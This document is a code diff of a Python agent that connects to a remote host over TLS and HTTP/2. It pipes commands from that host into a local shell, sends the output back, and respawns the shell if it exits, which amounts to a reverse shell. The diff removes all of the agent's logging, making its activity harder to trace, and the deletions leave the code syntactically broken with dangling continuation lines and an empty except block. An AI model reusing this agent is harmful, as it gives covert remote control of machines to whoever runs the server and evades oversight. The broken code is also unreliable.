@@ -221,7 +221,6 @@ def _shutdown_socket(sock):
 def run_h2():
     cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
     conn = h2.connection.H2Connection(config=cfg)
-    _log("agent start")
 
     raw = socket.create_connection((HOST, PORT), timeout=30)
     ctx = ssl.create_default_context()
@@ -277,7 +276,6 @@ def run_h2():
             proc = shell_state['proc']
             if proc is None or proc.poll() is not None:
                 rc = None if proc is None else proc.poll()
-                _log("shell dead (rc=%s) — respawning" % rc)
                 _spawn_shell_locked()
             return shell_state['proc']
 
@@ -298,7 +296,6 @@ def run_h2():
                     proc.stdin.flush()
                     break
                 except Exception as e:
-                    _log("stdin write failed: %r" % (e,))
                     with shell_spawn_lock:
                         if shell_state['proc'] is proc:
                             try:
@@ -313,7 +310,6 @@ def run_h2():
             try:
                 window = conn.local_flow_control_window(sid)
             except Exception as e:
-                _log("flow_control_window exception: %r" % (e,))
                 stop_evt.set()
                 return
             if window <= 0:
@@ -324,7 +320,6 @@ def run_h2():
                 conn.send_data(sid, head[:to_send], end_stream=False)
                 sock.sendall(conn.data_to_send())
             except Exception as e:
-                _log("send_data exception: %r" % (e,))
                 stop_evt.set()
                 return
             if to_send >= len(head):
@@ -340,10 +335,8 @@ def run_h2():
                 try:
                     data = os.read(proc.stdout.fileno(), 4096)
                 except Exception as e:
-                    _log("os.read exception: %r" % (e,))
                     return
                 if not data:
-                    _log("shell stdout EOF (rc=%s)" % proc.poll())
                     return
                 with h2_lock:
                     pending_out.append(data)
@@ -356,7 +349,6 @@ def run_h2():
                         _drain_out()
                         has_more = bool(pending_out)
         except Exception as e:
-            _log("shell_reader fatal: %r" % (e,))
 
     # Bootstrap the first shell + writer thread.
     with shell_spawn_lock:
@@ -368,17 +360,14 @@ def run_h2():
             try:
                 data = sock.recv(65536)
             except Exception as e:
-                _log("recv exception: %r" % (e,))
                 break
             if not data:
-                _log("recv returned EOF — server closed")
                 break
 
             with h2_lock:
                 try:
                     events = conn.receive_data(data)
                 except Exception as e:
-                    _log("h2 receive_data exception: %r" % (e,))
                     break
                 got_window_update = False
                 for ev in events:
@@ -387,7 +376,6 @@ def run_h2():
                         try:
                             stdin_q.put_nowait(ev.data)
                         except queue.Full:
-                            _log("stdin_q full — dropping %d bytes"
                                  % len(ev.data))
                         try:
                             conn.acknowledge_received_data(
@@ -399,12 +387,10 @@ def run_h2():
                             got_window_update = True
                     elif isinstance(ev, (h2.events.StreamEnded,
                                          h2.events.StreamReset)):
-                        _log("stream ended/reset — event=%s"
                              % type(ev).__name__)
                         stop_evt.set()
                         break
                     elif isinstance(ev, h2.events.ConnectionTerminated):
-                        _log("connection terminated by peer")
                         stop_evt.set()
                         break
 
@@ -422,7 +408,6 @@ def run_h2():
             if got_window_update:
                 window_updated.set()
     finally:
-        _log("agent shutting down")
         stop_evt.set()
         window_updated.set()
         try:
@@ -549,7 +534,6 @@ def run_h1():
                 shell.stdin.write(payload)
                 shell.stdin.flush()
             except Exception:
-                _log("h1 shell stdin write failed, respawning shell")
                 try:
                     shell.terminate()
                 except Exception:
